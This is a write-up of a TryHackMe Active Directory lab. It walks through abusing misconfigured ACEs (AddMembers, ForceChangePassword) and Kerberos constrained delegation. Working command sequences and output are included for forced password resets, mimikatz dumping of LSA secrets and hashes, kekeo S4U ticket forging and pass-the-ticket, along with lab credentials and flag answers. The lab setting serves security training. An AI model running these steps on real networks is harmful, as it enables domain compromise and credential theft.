#activedirectory 

Task1 - Introduction
------------------------------------

Continuing from our last rooms for AD here.

Here we will explore ways to exploit misconfigurations we may have found during enumeration.

-   AD Delegation
-   Forcing Authentication Relays
-   Group Policy Objects
-   Targeting AD Users
-   Domain Trusts
-   Silver and Golden Tickets


Task2 - Exploiting Permission Delegation
-------------------------------------------------------------------

AD can delegate permissions. This allows those with DA cred to allow other groups to handle requests such as change passwords for users etc.

__Permission Delegation__

These are also known as ACL based attacks. AD will allow admins to configure Access Control Entries (ACEs) that populate Discretionary Access Control Lists (DACLs).

If these ACEs are mis-configured, then we can exploit them. For example if passwords privs were granted to a general user support team which included ability to reset passwords of Domain Admins, they could use that to elevate their privs.

__Exploiting ACEs__

There is some docs in Bloodhound here:
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#

Here are some:

-   **ForceChangePassword:** We have the ability to set the user's current password without knowing their current password.
-   **AddMembers:** We have the ability to add users (including our own account), groups or computers to the target group.
-   **GenericAll:** We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
-   **GenericWrite:** We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
-   **WriteOwner:** We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
-   **WriteDACL:** We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
-   **AllExtendedRights:** We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

We can use AD-RSAT Powershell cmdlets or Powersploit to exploit these.

__Bloodhound__

Now we are using bloodhound.

Files are either downloadable or in /root/Rooms/ExploitingAD/ in a .zip file on the Attackbox.

Start neo4j:
```bash
# neo4j console start
```

Then in another terminal window start bloodhound:
```bash
# bloodhound --no-sandbox
```

Login w/ neo4j:neo4j

Next drag/drop all the files
Username: phillip.wilkins Password: Developmental1971

Now if we set pathfinding and check domain users -> t2 admins group and show path, we see 2 misconfigurations:
1. Domain users can use the AddMembers ACE.
2. The IT Support Group has ForceChangePassword ACE.

This means we can add a common user (us).

First SSH to the wrk1 machine as our user:
```bash
root@ip-10-10-77-197:~# ssh za.tryhackme.loc\\phillip.wilkins@thmwrk1.za.tryhackme.loc
The authenticity of host 'thmwrk1.za.tryhackme.loc (10.200.83.248)' can't be established.
ECDSA key fingerprint is SHA256:HTvSA1Qt987SOP3SRopzSQ22Q8lPttrUzTwuTyGDLck.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'thmwrk1.za.tryhackme.loc,10.200.83.248' (ECDSA) to the list of known hosts.
za.tryhackme.loc\phillip.wilki@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.
```

Now Load powershell and run the following:
```
za\phillip.wilkins@THMWRK1 C:\Users\phillip.wilkins>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\phillip.wilkins> Add-ADGroupMember "IT Support" -Members "phillip.wi
lkins"
```

We can check if that command was successful:
```
PS C:\Users\phillip.wilkins> Get-ADGroupMember -Identity "IT Support" 


distinguishedName : CN=brenda.black,OU=Consulting,OU=People,DC=za,DC=tryhackme, 
                    DC=loc
name              : brenda.black
objectClass       : user
objectGUID        : fbeba2af-fb5a-45ae-b15b-23f4a439f6e9
SamAccountName    : brenda.black
SID               : S-1-5-21-3885271727-2693558621-2658995185-1115

distinguishedName : CN=reece.noble,OU=Consulting,OU=People,DC=za,DC=tryhackme,D 
                    C=loc
name              : reece.noble
objectClass       : user
objectGUID        : d14e6d49-1454-4f97-ae79-f27809a54403
SamAccountName    : reece.noble
SID               : S-1-5-21-3885271727-2693558621-2658995185-1117 

distinguishedName : CN=paula.bailey,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=lo 
                    c
name              : paula.bailey
objectClass       : user
objectGUID        : bb8b8415-82ea-42ea-93ea-aa8afaf5f9ab
SamAccountName    : paula.bailey
SID               : S-1-5-21-3885271727-2693558621-2658995185-1126

distinguishedName : CN=barbara.reid,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=lo 
                    c
name              : barbara.reid
objectClass       : user
objectGUID        : ab5f2cb8-a247-4176-9631-29650d499a9d
SamAccountName    : barbara.reid
SID               : S-1-5-21-3885271727-2693558621-2658995185-1127

distinguishedName : CN=christine.hall,OU=Human  
                    Resources,OU=People,DC=za,DC=tryhackme,DC=loc
name              : christine.hall
objectClass       : user
objectGUID        : 4f202ec6-2235-44c4-9095-f20ceb4d98c6
SamAccountName    : christine.hall
SID               : S-1-5-21-3885271727-2693558621-2658995185-1130

distinguishedName : CN=phillip.wilkins,OU=Consulting,OU=People,DC=za,DC=tryhack 
                    me,DC=loc
name              : phillip.wilkins
objectClass       : user
objectGUID        : f738c055-21b4-4129-a08c-89f29b8170fe
SamAccountName    : phillip.wilkins
SID               : S-1-5-21-3885271727-2693558621-2658995185-1131

PS C:\Users\phillip.wilkins>
```


Yes!

__ForceChangePassword__

Now that we are in the IT Support Group, we have the ForceChangePassword ACE over the Tier2 Admins Group. 

Lets find a member by using the same Get-ADGroupMember cmdlet again:

```bash
PS C:\Users\phillip.wilkins> Get-ADGroupMember -Identity "Tier 2 Admins"        


distinguishedName : CN=t2_lawrence.lewis,OU=T2
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

distinguishedName : CN=t2_leon.francis,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660

distinguishedName : CN=t2_henry.harvey,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

distinguishedName : CN=t2_june.russell,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_june.russell
objectClass       : user
objectGUID        : e9b91021-2cb4-4a81-bf09-13a24393ffb7
SamAccountName    : t2_june.russell
SID               : S-1-5-21-3885271727-2693558621-2658995185-4407

distinguishedName : CN=t2_kathleen.mills,OU=T2
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_kathleen.mills
objectClass       : user
objectGUID        : 3be7353e-7c5c-4f46-9790-aef3bbe826a1
SamAccountName    : t2_kathleen.mills
SID               : S-1-5-21-3885271727-2693558621-2658995185-4493

distinguishedName : CN=t2_irene.nash,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_irene.nash
objectClass       : user
objectGUID        : 59429b63-1330-4646-8155-e7d95da0aa68
SamAccountName    : t2_irene.nash
SID               : S-1-5-21-3885271727-2693558621-2658995185-4654

distinguishedName : CN=t2_henry.shaw,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_henry.shaw
objectClass       : user
objectGUID        : 4045398b-de3e-463b-a8e7-085e5f09f478
SamAccountName    : t2_henry.shaw
SID               : S-1-5-21-3885271727-2693558621-2658995185-5230

distinguishedName : CN=t2_alan.riley,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_alan.riley
objectClass       : user
objectGUID        : d8398c06-1f07-403c-a4b5-0882b1233e1e
SamAccountName    : t2_alan.riley
SID               : S-1-5-21-3885271727-2693558621-2658995185-5243

distinguishedName : CN=t2_jordan.hawkins,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_jordan.hawkins
objectClass       : user
objectGUID        : c43fea27-5821-4a28-8e4b-98ecdb04d649
SamAccountName    : t2_jordan.hawkins
SID               : S-1-5-21-3885271727-2693558621-2658995185-5245

distinguishedName : CN=t2_ross.bird,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_ross.bird
objectClass       : user
objectGUID        : d7cb6223-38f0-4553-9ef3-d10727bdcc02
SamAccountName    : t2_ross.bird
SID               : S-1-5-21-3885271727-2693558621-2658995185-5316

distinguishedName : CN=t2_robin.wyatt,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_robin.wyatt
objectClass       : user
objectGUID        : 88b92158-56a1-43cb-b21c-1514098524c2
SamAccountName    : t2_robin.wyatt
SID               : S-1-5-21-3885271727-2693558621-2658995185-5409

distinguishedName : CN=t2_caroline.dawson,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_caroline.dawson
objectClass       : user
objectGUID        : 38060b6d-9e78-40bc-95d5-e7d7a61abf6e
SamAccountName    : t2_caroline.dawson
SID               : S-1-5-21-3885271727-2693558621-2658995185-5437

distinguishedName : CN=t2_melanie.davies,OU=T2  
                    Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_melanie.davies
objectClass       : user
objectGUID        : c9625ed3-0391-40ba-9c6d-b4046049c434
SamAccountName    : t2_melanie.davies
SID               : S-1-5-21-3885271727-2693558621-2658995185-5929



PS C:\Users\phillip.wilkins>

```

Now try to force reset the passwords for one of those users:
```bash
PS C:\Users\phillip.wilkins> $Password = ConvertTo-SecureString "d4b0mb12345!" -AsPlainText -Force
PS C:\Users\phillip.wilkins> Set-ADAccountPassword -Identity "t2_kathleen.mills"
 -Reset -NewPassword $Password
Set-ADAccountPassword : Access is denied 
At line:1 char:1
+ Set-ADAccountPassword -Identity "t2_kathleen.mills" -Reset -NewPasswo ...     
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (t2_kathleen.mills:ADAccount)   
   [Set-ADAccountPassword], UnauthorizedAccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessE  
   xception,Microsoft.ActiveDirectory.Management.Commands.SetADAccountPasswor   
  d

```

Looks like our previous AD changes have not fully propogated the network. We should logout of ssh/rdp, wait awhile login and try this command again. Also can run gpupdate /force then disconnect and login again.

After a few mins we log in and run the commands again and it is successful.

```powershell
PS C:\Users\phillip.wilkins> $Password = ConvertTo-SecureString "d4b0mb12345!" -
AsPlainText -Force
PS C:\Users\phillip.wilkins> Set-ADAccountPassword -Identity "t2_kathleen.mills"
 -Reset -NewPassword $Password
PS C:\Users\phillip.wilkins>  
```

Now we can simply RDP in as kathleen to thmwrk1 and go to the `C:\Users\Administrator\Desktop` and run `type flag1.txt` to get our flag:

```
root@ip-10-10-77-197:~# xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_kathleen.mills /p:d4b0mb12345! /nocert
connected to thmwrk1.za.tryhackme.loc:3389
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@           WARNING: CERTIFICATE NAME MISMATCH!           @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
The hostname used for this connection (thmwrk1.za.tryhackme.loc) 
does not match the name given in the certificate:
Common Name (CN):
	THMWRK1.za.tryhackme.loc
A valid certificate for the wrong name should NOT be trusted!
Certificate details:
	Subject: CN = THMWRK1.za.tryhackme.loc
	Issuer: CN = THMWRK1.za.tryhackme.loc
	Thumbprint: 0a:71:d9:8f:4b:b5:d3:dc:3f:f4:08:5b:bf:ae:dc:70:47:32:20:87
The above X.509 certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired. Please look at the documentation on how to create local certificate store for a private CA.
Do you trust the above certificate? (Y/N) y
```

```shell-session
C:\Users\Administrator\Desktop>type flag1.txt
THM{Permission.Delegation.FTW!}
```

__Questions__

Which ACE would allow you to update any non-protected parameter of a target object?
Answer: _GenericWrite_

What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?
Answer: _THM{Permission.Delegation.FTW!}_


Task3 - Exploiting Kerberos Delegation
-----------------------------------------------

Using Kerberos Delegation is to enable an application to access resources hosted on another server.. For example a web server that needs to access a SQL database hosted on another server.

With Kerberos we can have a service account delegated to a SQL service. The user would then log into the web application, and it would in turn request access to the DB on behalf of the user. This way the user only gets access to the database items they have permissions for rather than all of it.

__Constrained vs. Unconstrained__

Unconstrainted has no limits and is least secure.  Via this method we can intercept TGTs for another privileged user trying to access a service and then impersonate them.

Microsoft came up with a new solution to combat this and introduced Constrained Delegation in 2003. This restricts what services an account can be delegated to, and limits exposure if they are compromised. Here is an example of services that can be configured for delegation:

-   HTTP - Used for web applications to allow pass-through authentication using AD credentials.  
-   CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.  
-   LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.  
-   HOST - Allows delegation of account for all activities on the host.  
-   MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

While is is more complex to exploit. IT can lead to power exploits such as compromising an AD account which had Constrainded Delegation configured, and getting either the plaintxt or NTLM hash we can generating TGT and then use that to execute a TGS request for any non-sensative user account to access the service as that user.

__Resource-Based Constrained Delegation__

Recource-Based Constrained Delegation (RBCD) was an additional change by Microsoft in 2012. This changed it completely to say that instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This way, a Service Owner controls who can access it.

There is a detailed example here: https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/

Now we willl use the constrained method:

```powershell
PS C:\Users\phillip.wilkins> Import-Module C:\Tools\PowerView.ps1
PS C:\Users\phillip.wilkins> Get-NetUser -TrustedToAuth


logoncount               : 45
badpasswordtime          : 1/1/1601 12:00:00 AM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc     
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 11/10/2022 10:59:55 AM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155       
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 11/10/2022 10:59:55 AM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc,
                           WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,  
                           http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC 
                           =loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 11/11/2022 2:37:22 AM
badpwdcount              : 0
cn                       : IIS Server
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD,
                           TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 147508
```

From this output we see IIS svc can delegate the HTTP and WSMAN services on THMSERVER1

This seems like we can only access websites on behalf of impersonated users, but PowerShell Remoting uses the HTTP and WSMAN services as well. Ideally we could impersonate a t1_admin account to get admin privs on THMSERVER1.

Now that we have kathleens admin access lets run mimikatz:

```shell-session
root@ip-10-10-77-197:~# ssh za.tryhackme.loc\\t2_kathleen.mills@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_kathleen.m@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_kathleen.mills@THMWRK1 C:\Users\t2_kathleen.mills>cd C:\Tools 

za\t2_kathleen.mills@THMWRK1 C:\Tools>dir 
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Tools

11/10/2022  09:55 PM    <DIR>          .
11/10/2022  09:55 PM    <DIR>          ..
04/29/2022  10:48 AM    <DIR>          kekeo
04/30/2022  10:52 AM    <DIR>          mimikatz_trunk
04/30/2022  10:38 AM    <DIR>          PowerSploit
04/30/2022  11:47 AM           770,279 PowerView.ps1
06/10/2022  10:49 AM           906,752 SharpHound.exe
06/13/2022  05:57 PM           157,696 SpoolSample.exe
06/13/2022  05:57 PM               178 SpoolSample.exe.config
06/13/2022  05:58 PM           157,696 SpoolSample_v4.5_x64.exe
11/10/2022  09:11 PM             5,012 svcorp_tgs.csv
11/10/2022  10:24 PM    <DIR>          test-k
11/10/2022  08:16 PM             1,631 TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http
~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
11/10/2022  08:17 PM             1,348 TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcI
IS@ZA.TRYHACKME.LOC.kirbi
11/10/2022  08:17 PM             1,642 TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsma
n~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
11/10/2022  08:16 PM             1,322 TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.try
hackme.loc@ZA.TRYHACKME.LOC.kirbi
              10 File(s)      2,003,556 bytes
               6 Dir(s)  50,497,892,352 bytes free

za\t2_kathleen.mills@THMWRK1 C:\Tools>cd mimikatz_trunk

za\t2_kathleen.mills@THMWRK1 C:\Tools\mimikatz_trunk>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9
 
 Directory of C:\Tools\mimikatz_trunk

04/30/2022  10:52 AM    <DIR>          .
04/30/2022  10:52 AM    <DIR>          ..
09/17/2020  02:04 AM             2,834 kiwi_passwords.yar
03/21/2020  06:20 PM             2,850 mimicom.idl
11/02/2020  12:13 AM             5,211 README.md
04/30/2022  10:52 AM    <DIR>          Win32
04/30/2022  10:52 AM    <DIR>          x64
               3 File(s)         10,895 bytes
               4 Dir(s)  50,497,892,352 bytes free

za\t2_kathleen.mills@THMWRK1 C:\Tools\mimikatz_trunk>cd x64
 
za\t2_kathleen.mills@THMWRK1 C:\Tools\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/       

mimikatz # token::elevate 
Token Id  : 0 
User name :
SID name  : NT AUTHORITY\SYSTEM

488     {0;000003e7} 1 D 17563          NT AUTHORITY\SYSTEM     S-1-5-18        
(04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0021702d} 0 D 2198898     ZA\t2_kathleen.mills    S-1-5-21
-3885271727-2693558621-2658995185-4493  (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2225915     NT AUTHORITY\SYSTEM     S-1-5-18
        (04g,21p)       Impersonation (Delegation)
```

Dump LSA Secrets:
```shell-session
mimikatz # lsadump::secrets 
Domain : THMWRK1 
SysKey : a1403e57976b472bce5f231922ca3942

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) 
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521a
fd0be6309a08fd604c9a95c2af4463

Secret  : $MACHINE.ACC
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?n
eR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e 
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?n
eR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e 
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8
f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d79
4990e72ee0
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038
d794990e72ee0
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9
f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31  
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24
f444d07431
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15
b24f444d07431

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 9
9 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 
99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 9
9 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 
99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhac
kme.loc
cur/text: Password1@

mimikatz #

```

-   token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
-   lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.

Now we have a plaintext password for svcIIS account, we can do a Kerberos delegation attack.

Be sure to exit out of mimikatz after the token::elevate or the tickets we make in the next steps will be out of context.

now we run kekeo:
```shell-session
za\t2_kathleen.mills@THMWRK1 C:\Tools\kekeo\x64>kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo) 
                                             with 10 modules * * */

kekeo #

```

Now generate a TGT that we can use to generate tickets for the HTTP and WSMAN services:
```shell-session
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@     
Realm        : za.tryhackme.loc (za) 
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee
36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.83.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHA
CKME.LOC.kirbi'
```

Now we can use that TGT to forge TGS requests for the account we wish to impersonate. We need to do this for both HTTP and WSMAN to allow us to create a PSSession on THMSERVER1.

```shell-session
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRY
HACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.k
irbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC 
  [enc-krb-cred] T: [11/11/2022 4:53:32 AM ; 11/11/2022 2:53:32 PM] {R:11/18/202
2 4:53:32 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renew
able ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): dda7a27e17ea19d44e184
4de7d2b02b55bc7fb59e1be023aedac859c14946b25
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.83.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC
.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

kekeo #

```


Run it again for the WSMAN service:
```shell-session
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRY
HACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.lo
c
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.k
irbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [11/11/2022 4:53:32 AM ; 11/11/2022 2:53:32 PM] {R:11/18/202
2 4:53:32 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renew
able ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): dda7a27e17ea19d44e184
4de7d2b02b55bc7fb59e1be023aedac859c14946b25 
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.83.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC
.kirbi'
Service(s):
  [s4u2proxy] wsman/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

Now that we have both TGS tickets, we can use mimikatz to import them:

We start mimikats here from the kekeo directory since this is where we saved the tickets!

```shell-session
za\t2_kathleen.mills@THMWRK1 c:\Tools\kekeo\x64> ..\..\mimikatz_trunk\x64\mimika
tz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
  
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.z
a.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@
ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za
.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@Z
A.TRYHACKME.LOC.kirbi': OK

mimikatz # exit
Bye!
```

We can verify with klist.

Now just run the powershell script to get access:
```shell-session
PS C:\Tools\kekeo\x64> New-PSSession -ComputerName thmserver1.za.tryhackme.loc  

 Id Name            ComputerName    ComputerType    State         Configuration 
                                                                  Name
 -- ----            ------------    ------------    -----         ------------- 
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.... 


PS C:\Tools\kekeo\x64> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc

[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents>  

```

__Questions__
Which Kerberos Delegation type allows for delegation of all services?
Answer: _Unconstrained Delegation_

